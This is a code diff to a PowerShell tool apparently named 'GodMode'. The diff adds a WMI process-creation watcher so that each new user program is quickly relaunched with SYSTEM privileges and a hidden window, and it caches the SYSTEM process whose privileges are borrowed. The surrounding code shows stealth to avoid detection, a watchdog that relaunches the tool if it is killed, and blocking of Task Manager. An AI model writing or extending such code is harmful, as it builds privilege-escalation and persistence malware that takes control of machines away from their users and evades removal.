@@ -2195,6 +2195,15 @@ function Enable-ElevationPrivileges {
 
 function Find-SystemProcessCandidate {
     param([int]$MaxScan = 30)
+
+    # Cache hit: valid for 60 seconds and process still alive
+    if ($script:CachedSystemPid -gt 0 -and ((Get-Date) - $script:CachedSystemPidTimestamp) -lt [TimeSpan]::FromSeconds(60)) {
+        try {
+            $proc = Get-Process -Id $script:CachedSystemPid -ErrorAction SilentlyContinue
+            if ($proc) { return $script:CachedSystemPid }
+        } catch {}
+    }
+
     $allProcs = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue
     if (-not $allProcs) {
         Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "ERROR" -Message "Get-CimInstance Win32_Process returned nothing. WMI may be broken or restricted."
@@ -2215,6 +2224,8 @@ function Find-SystemProcessCandidate {
                     if ($test) {
                         $diagnostics += "SUCCESS: Selected Session 1 SYSTEM process: $($proc.Name) PID=$($proc.ProcessId)"
                         Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
+                        $script:CachedSystemPid = $proc.ProcessId
+                        $script:CachedSystemPidTimestamp = Get-Date
                         return $proc.ProcessId
                     } else {
                         $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -2242,6 +2253,8 @@ function Find-SystemProcessCandidate {
                 if ($test) {
                     $diagnostics += "SUCCESS: Selected fallback SYSTEM process: $($proc.Name) PID=$($proc.ProcessId) Session=$($proc.SessionId)"
                     Write-DebugLog -FunctionName "Find-SystemProcessCandidate" -Action "INFO" -Message ($diagnostics -join " | ")
+                    $script:CachedSystemPid = $proc.ProcessId
+                    $script:CachedSystemPidTimestamp = Get-Date
                     return $proc.ProcessId
                 } else {
                     $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
@@ -3947,6 +3960,65 @@ function Get-NonSystemProcessesParallel {
     return $results
 }
 
+$script:ProcessCreationQueue = [System.Collections.ArrayList]::Synchronized([System.Collections.ArrayList]::new())
+$script:ProcessCreationWatcher = $null
+
+function Register-ProcessCreationWatcher {
+    try {
+        $query = "SELECT * FROM __InstanceCreationEvent WITHIN 5 WHERE TargetInstance ISA 'Win32_Process'"
+        $script:ProcessCreationWatcher = New-Object System.Management.ManagementEventWatcher($query)
+        $script:ProcessCreationWatcher.EventArrived += {
+            param($sender, $eventArgs)
+            $proc = $eventArgs.NewEvent.TargetInstance
+            if ($proc -and $proc.ExecutablePath -and $proc.ExecutablePath -like "*.exe" -and $proc.SessionId -gt 0) {
+                $arguments = ""
+                if ($proc.CommandLine) {
+                    $cmdLine = $proc.CommandLine
+                    if ($cmdLine.StartsWith('"')) {
+                        $endQuote = $cmdLine.IndexOf('"', 1)
+                        if ($endQuote -gt 0 -and $endQuote -lt $cmdLine.Length - 1) {
+                            $arguments = $cmdLine.Substring($endQuote + 1).Trim()
+                        }
+                    } else {
+                        $firstSpace = $cmdLine.IndexOf(' ')
+                        if ($firstSpace -gt 0) {
+                            $arguments = $cmdLine.Substring($firstSpace + 1).Trim()
+                        }
+                    }
+                }
+                [void]$script:ProcessCreationQueue.Add([PSCustomObject]@{
+                    ProcessId = $proc.ProcessId
+                    ExecutablePath = $proc.ExecutablePath
+                    Arguments = $arguments
+                    SessionId = $proc.SessionId
+                    CreationDate = $proc.CreationDate
+                })
+            }
+        }
+        $script:ProcessCreationWatcher.Start()
+        $script:ProcessCreationWatcherActive = $true
+        return $true
+    } catch {
+        Write-Log -Message "WMI process creation watcher failed to register: $_" -Type "WARN" -Color Yellow
+        $script:ProcessCreationWatcherActive = $false
+        return $false
+    }
+}
+
+function Unregister-ProcessCreationWatcher {
+    if ($script:ProcessCreationWatcher) {
+        try {
+            $script:ProcessCreationWatcher.Stop()
+            $script:ProcessCreationWatcher.Dispose()
+        } catch {}
+        $script:ProcessCreationWatcher = $null
+    }
+    $script:ProcessCreationWatcherActive = $false
+    if ($script:ProcessCreationQueue) {
+        $script:ProcessCreationQueue.Clear()
+    }
+}
+
 function Invoke-ExistingProcessElevation {
     $isSystem = ([Environment]::UserName -eq "SYSTEM") -or (([Security.Principal.WindowsIdentity]::GetCurrent().User.Value) -eq "S-1-5-18")
     if (-not $isSystem) {
@@ -4119,6 +4191,21 @@ function Start-Monitoring {
 
     while ($true) {
         try {
+            # --- Fast event-driven elevation: drain WMI process-creation queue ---
+            if ($script:ProcessCreationWatcherActive -and $script:ProcessCreationQueue -ne $null -and $script:ProcessCreationQueue.Count -gt 0) {
+                while ($script:ProcessCreationQueue.Count -gt 0) {
+                    $evt = $null
+                    [void]$script:ProcessCreationQueue.TryDequeue([ref]$evt)
+                    if ($evt -and $evt.ProcessId -gt 0 -and $evt.ExecutablePath -and $evt.ExecutablePath -like "*.exe") {
+                        $path = $evt.ExecutablePath
+                        $arguments = $evt.Arguments
+                        if (-not $lastElevatedPid.ContainsKey($evt.ProcessId)) {
+                            $lastElevatedPid[$evt.ProcessId] = Get-Date
+                            Monitor-ElevateProcess -Path $path -Arguments $arguments -HideWindow
+                        }
+                    }
+                }
+            }
             Start-Sleep -Milliseconds 500
             $loopCount++
             if ($loopCount % 120 -eq 0) {
@@ -4212,13 +4299,16 @@ function Start-Monitoring {
 
         # --- New Process Elevation ---
         # Only elevate processes in user sessions (SessionId > 0) to avoid duplicating system processes
-        $Now = Get-Date
-        $newProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
-            try {
-                $_.SessionId -gt 0 -and
-                $_.CreationDate -and
-                ([System.Management.ManagementDateTimeConverter]::ToDateTime($_.CreationDate)) -gt $Now.AddSeconds(-5)
-            } catch { $false }
+        $newProcesses = @()
+        if (-not $script:ProcessCreationWatcherActive) {
+            $Now = Get-Date
+            $newProcesses = Get-CimInstance Win32_Process -ErrorAction SilentlyContinue | Where-Object {
+                try {
+                    $_.SessionId -gt 0 -and
+                    $_.CreationDate -and
+                    ([System.Management.ManagementDateTimeConverter]::ToDateTime($_.CreationDate)) -gt $Now.AddSeconds(-5)
+                } catch { $false }
+            }
         }
 
         foreach ($proc in $newProcesses) {
@@ -4374,6 +4464,9 @@ function Enable-GodMode {
     # --- Stealth mode: harder to detect ---
     Invoke-StealthMode
 
+    # --- Event-driven WMI process creation watcher for fast elevation ---
+    Register-ProcessCreationWatcher | Out-Null
+
     # --- SYSTEM watchdog: relaunch as SYSTEM if monitoring is killed ---
     Register-SystemWatchdog
 
@@ -4388,6 +4481,7 @@ function Disable-GodMode {
     Write-DebugLog -FunctionName "Disable-GodMode" -Action "ENTRY"
     Remove-ItemProperty -Path $GodModeFlagRegPath -Name $GodModeFlagRegName -ErrorAction SilentlyContinue
     Unregister-StealthTask
+    Unregister-ProcessCreationWatcher
     Unregister-SystemWatchdog
     Unblock-TaskManager
 
